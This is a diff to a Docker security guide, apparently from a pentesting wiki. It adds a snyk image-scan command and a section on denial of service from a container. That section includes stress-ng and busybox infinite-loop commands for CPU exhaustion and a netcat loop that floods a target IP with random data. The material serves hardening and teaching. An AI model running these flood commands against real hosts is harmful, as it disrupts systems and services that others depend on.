@@ -83,6 +83,12 @@ Note that we do not currently have vulnerability data for your image.
 trivy -q -f json <ontainer_name>:<tag>
 ```
 
+* [**`snyk`**](https://docs.snyk.io/snyk-cli/getting-started-with-the-cli)
+
+```bash
+snyk container test <image> --json-file-output=<output file> --severity-threshold=high
+```
+
 * [**`clair-scanner`**](https://github.com/arminc/clair-scanner)
 
 ```bash
@@ -265,6 +271,26 @@ An authorization plugin **approves** or **denies** **requests** to the Docker **
 {% content-ref url="authz-and-authn-docker-access-authorization-plugin.md" %}
 [authz-and-authn-docker-access-authorization-plugin.md](authz-and-authn-docker-access-authorization-plugin.md)
 {% endcontent-ref %}
+
+## DoS from a container
+
+If you are not properly limiting the resources a container can use, a compromised container could DoS the host where it's running.
+
+* CPU DoS
+
+```bash
+# stress-ng
+sudo apt-get install -y stress-ng && stress-ng --vm 1 --vm-bytes 1G --verify -t 5m
+
+# While loop
+docker run -d --name malicious-container -c 512 busybox sh -c 'while true; do :; done'
+```
+
+* Bandwidth DoS
+
+```bash
+nc -lvp 4444 >/dev/null & while true; do cat /dev/urandom | nc <target IP> 4444; done
+```
 
 ## Interesting Docker Flags
 
